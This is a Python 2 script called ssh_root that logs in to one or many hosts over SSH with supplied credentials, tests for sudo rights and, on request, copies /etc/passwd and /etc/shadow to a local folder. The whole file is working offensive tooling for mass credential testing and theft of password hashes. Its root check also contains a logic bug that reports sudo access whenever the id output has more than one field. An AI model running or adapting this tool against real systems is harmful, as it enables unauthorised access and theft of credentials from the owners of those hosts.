#!/usr/bin/python

'''
Name: ssh_root
Author: MacR6
Description: This tool takes user creds and a an IP or list of IPs/Hosts and tries to connect
to the ssh server.  If it is successful with the creds it will attempt to run a "sudo id" to determine if 
the user has sudo rights.  If you tell it to grab the passwd and shadow file it will store them in a directory called sshenum
Date: 02Oct2015
'''


import paramiko, socket, argparse, sys, getpass, os

# Setup colors
class bcolors:
	HEADER = '\033[95m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

# After connnecting are we root?
def isroot(ssh,password,get_files,host):

	stdin,stdout,stderr = ssh.exec_command('sudo -S id')
	stdin.write(password + '\n')
	stdin.flush()
	stdin.write(password + '\n')
	stdin.flush()
	stdin.write(password + '\n')
	stdin.flush()

	data = stdout.readline()

	# Check to see if the user can sudo.  If they can't data will be empty
	if data:
		#split data to see if user is root
		a = data.split()

		if '=0(' in a[0] or a[1] or a[2]:
			print bcolors.GREEN + '[+] User can sudo to root' + bcolors.ENDC
			if get_files:
				if not os.path.exists('sshenum'):
					os.makedirs('sshenum')
				# can't figure out how to pass sudo to sftp.get() so I'm doing it by copying
				# the data from cat'ing it out.  So sue me.
				# attempt to grab contents of passwd file
				stdin,stdout,stderr = ssh.exec_command('sudo -S cat /etc/passwd')
				stdin.write(password + '\n')
				stdin.flush()
				
				data = stdout.readlines()
				if not data:
					error = True
					passwd_file = False
				else:
					with open('./sshenum/' + host + '_passwd','a') as open_file:
						for line in data:
							open_file.write(line.rstrip() +'\n')
						open_file.close()
					error = False
					passwd_file = True
					
				# attempt to grab shadow file and redirect the output back to us
				stdin,stdout,stderr = ssh.exec_command('sudo -S cat /etc/shadow')
				stdin.write(password + '\n')
				stdin.flush()
								
				data = stdout.readlines()
				if not data:
					file_copy_error(error,passwd_file,shadow_file = False)
				else:
					with open('./sshenum/' + host + '_shadow','a') as open_file:
						for line in data:
							open_file.write(line.rstrip() +'\n')
						open_file.close()
					file_copy_error(error,passwd_file, shadow_file = True)

	else:		
		print bcolors.YELLOW + '[+] User can\'t sudo to root' + bcolors.ENDC

# Try to connect to SSH server
def ssh_connect(host,port,user,password,priv_key,get_files):

	try:
		print bcolors.BLUE + '[-] Trying to connect to %s' % host +bcolors.ENDC

		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host,port=port,username=user,password=password,look_for_keys=True,key_filename=priv_key,timeout=5)
		
		# If the user is root there is no need to check sudo
		if user == 'root':
			print bcolors.GREEN + '[+] Connected to %s as %s' % (host,user) + bcolors.ENDC
			if get_files:
				root_grab_pass_files(ssh,host)
		# But if they aren't root then we need to check and see if they can sudo
		else:
			print bcolors.GREEN + '[+] Connected to %s as %s' % (host,user) + bcolors.ENDC
			isroot(ssh,password,get_files,host)

	except paramiko.AuthenticationException:
		print bcolors.RED + '[-] User can\'t login to %s' % host + bcolors.ENDC

	except socket.error:
		print bcolors.RED + '[-] Could not connect to %s' % host + bcolors.ENDC

def root_grab_pass_files(ssh,host):
	if not os.path.exists('sshenum'):
		os.makedirs('sshenum')
	sftp = ssh.open_sftp()

	try:
		sftp.get('/etc/passwd','./sshenum/' + host +'_passwd')
		sftp.get('/etc/shadow','./sshenum/' + host + '_shadow')
		file_copy_error(error = False,passwd_file = True,shadow_file = True)
	except:
		print bcolors.RED + '[!] Error copying files' + bcolors.ENDC

def file_copy_error(error,passwd_file,shadow_file):
	if error and not (passwd_file or shadow_file):
		print bcolors.RED + '[!] Error copying files' + bcolors.ENDC
	if passwd_file:
		print bcolors.GREEN + '[+] Copied passwd file' + bcolors.ENDC
	else:
		print bcolors.RED + '[!] Error copying passwd file' + bcolors.ENDC
	if shadow_file:
		print bcolors.GREEN + '[+] Copied shadow file' + bcolors.ENDC
	else:
		print bcolors.RED + '[!] Error copying shadow file' + bcolors.ENDC

try:
##Add commandline arguments part here	
	parser = argparse.ArgumentParser(description='Is root?')
	parser.add_argument('-u','--user',help='Username to test',required=True)
	parser.add_argument('-i','--host',help='Input single IP/Hostname or use -H/--host_file for multiple IPs')
	parser.add_argument('-P','--port',default='22',type=int,help='Leave blank for default ssh port')
	parser.add_argument('-p','--password',help='Input user\'s password or leave blank and enter on command line')
	parser.add_argument('-H','--host_file',help='List of IPs, each on a new line.')
	parser.add_argument('-k','--private_key_file',help='Input absolute path to private keys')
	parser.add_argument('-f','--files',help='Grab /etc/passwd and /etc/shadow',action='store_true')

	args = parser.parse_args()

	#Need at least hostname and an IP address or IP file
	if not args.user or not (args.host or args.host_file):
		print bcolors.RED + '\n\n[!] Must have at least a user and host/IP...\n' + bcolors.ENDC
		print bcolors.RED + '[!] Exiting...\n' + bcolors.ENDC
		parser.print_help()
		sys.exit()

	# Can't put host file and single IP on command line
	if args.host and args.host_file:
		print bcolors.RED + '\n\n[!] Can not specify host file and single host together...' + bcolors.ENDC
		print bcolors.RED + '[!] Exiting...\n' + bcolors.ENDC 
		parser.print_help()
		sys.exit()

	#If password is empty then we need to prompt user for it.
	if not args.password:
		args.password = getpass.getpass('Please enter password: ')
		if not args.password:
			print bcolors.RED + '\n\n[!] Exiting...\n' + bcolors.ENDC
			print bcolors.RED + '[!] Need password for login or sudo\n' + bcolors.ENDC
			sys.exit()

	#If user supplied a host file we need to use it here.
	if args.host_file:
		with open(args.host_file) as host_file:
			for line in host_file:
				args.host = line.rstrip('\n')
				if not line.strip():
					print ''
				else:
					ssh_connect(args.host,args.port,args.user,args.password,args.private_key_file,args.files)
	else:
		ssh_connect(args.host,args.port,args.user,args.password,args.private_key_file,args.files)


except KeyboardInterrupt:
	print bcolors.RED + '\n\n[!] Exiting...\n' + bcolors.ENDC






